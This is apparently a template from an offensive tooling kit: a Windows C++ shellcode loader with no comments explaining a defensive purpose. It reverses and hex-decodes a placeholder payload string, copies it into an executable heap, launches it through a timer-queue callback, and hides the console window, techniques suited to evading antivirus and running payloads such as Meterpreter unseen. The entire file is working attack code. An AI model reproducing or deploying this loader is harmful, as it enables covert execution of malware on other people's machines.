#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

void StringToHex(char* str, unsigned char* out) {
	char* p = str;
	char high = 0, low = 0;
	int tmplen = strlen(p);
	int cnt = 0;
	tmplen = strlen(p);
	while (cnt < (tmplen / 2)) {
		high = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
		low = (*(++p) > '9' && ((*p <= 'F') || (*p <= 'f'))) ? *(p)-48 - 7 : *(p)-48;
		out[cnt] = ((high & 0x0f) << 4 | (low & 0x0f));
		p++;
		cnt++;
	}
	if (tmplen % 2 != 0) out[cnt] = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
	return;
}


void hardCodeMeter() {
	char hexbuffer[] = "{{SHELLCODE_STR}}";
	_strrev(hexbuffer);
	unsigned char buffer[409600] = { 0 };
	StringToHex(hexbuffer, buffer);

	//heap
	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	LPVOID ptr = HeapAlloc(heapp, 0, sizeof(buffer));

	RtlMoveMemory(ptr, buffer, sizeof(buffer));

	//callback
	HANDLE timer;
	HANDLE queue = ::CreateTimerQueue();
	HANDLE gDoneEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!::CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)ptr, NULL, 100, 0, 0)) {

		printf("Fail");
	}

	if (::WaitForSingleObject(gDoneEvent, INFINITE) != WAIT_OBJECT_0)
		printf("WaitForSingleObject failed (%d)\n", GetLastError());

}


//
// Main function
//
int main() {
	hardCodeMeter();
}
